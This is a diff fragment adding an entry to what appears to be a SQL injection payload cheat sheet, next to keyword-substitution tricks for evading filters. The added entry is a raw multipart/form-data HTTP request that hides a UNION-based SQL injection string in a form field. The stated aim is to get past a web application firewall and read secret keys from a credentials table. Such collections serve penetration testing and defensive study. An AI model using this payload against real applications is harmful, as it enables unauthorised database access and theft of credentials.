@@ -467,6 +467,27 @@ OR    -> ||
 WHERE -> HAVING
 ```
 
+multipart form data to bypass waf 
+```Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575
+
+Content-Length: 366
+
+-----------------------------974767299852498929531610575
+
+Content-Disposition: form-data; name="name"
+
+'or 1='1' union all select secret_key, '16' FROM target_credentials offset 13--
+
+-----------------------------974767299852498929531610575
+
+Content-Disposition: form-data; name="myFile"; filename="foo.txt"
+
+Content-Type: text/plain
+
+(content of the uploaded file foo.txt)
+
+-----------------------------974767299852498929531610575--``` 
+
 Information_schema.tables Alternative
 
 ```sql
